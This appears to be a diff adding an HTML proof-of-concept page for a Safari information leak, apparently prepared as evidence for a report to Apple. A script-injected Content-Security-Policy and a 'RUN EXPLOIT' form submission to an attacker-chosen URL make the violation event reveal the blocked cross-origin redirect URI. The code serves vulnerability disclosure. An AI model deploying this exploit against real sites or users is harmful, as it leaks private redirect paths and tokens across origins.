@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Safari Leak Evidence - Putra Mahardika</title>
+    <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
+    <script>eruda.init();</script>
+    
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const targetUrl = params.get('url') || 'https://fb.com/secret/path/test';
+        const allowedDomain = params.get('domain') || 'fb.com';
+
+        const metaCSP = document.createElement('meta');
+        metaCSP.setAttribute('http-equiv', 'Content-Security-Policy');
+        metaCSP.setAttribute('content', `default-src 'self' 'unsafe-inline'; form-action 'self' ${allowedDomain};`);
+        document.head.appendChild(metaCSP);
+    </script>
+</head>
+<body>
+    <h2>Safari blockedURI Leak Evidence</h2>
+    <p>Target: <strong id="displayUrl"></strong></p>
+    <button id="exploitBtn" style="padding: 15px; font-weight: bold;">RUN EXPLOIT</button>
+
+    <script>
+        document.getElementById('displayUrl').innerText = targetUrl;
+
+        // Listener khusus buat Console
+        document.addEventListener('securitypolicyviolation', (e) => {
+            console.log('--- VIOLATION DETECTED ---');
+            console.log('Blocked URI:', e.blockedURI); // Ini yang diminta Apple
+            console.log('Violated Directive:', e.violatedDirective);
+            console.log('Full Event Object:', e);
+        });
+
+        document.getElementById('exploitBtn').addEventListener('click', () => {
+            const win = window.open('about:blank');
+            try { win.close(); } catch(e) {}
+            
+            const form = document.createElement('form');
+            form.method = 'GET';
+            form.action = targetUrl;
+            document.body.appendChild(form);
+            form.submit();
+        });
+    </script>
+</body>
+</html>
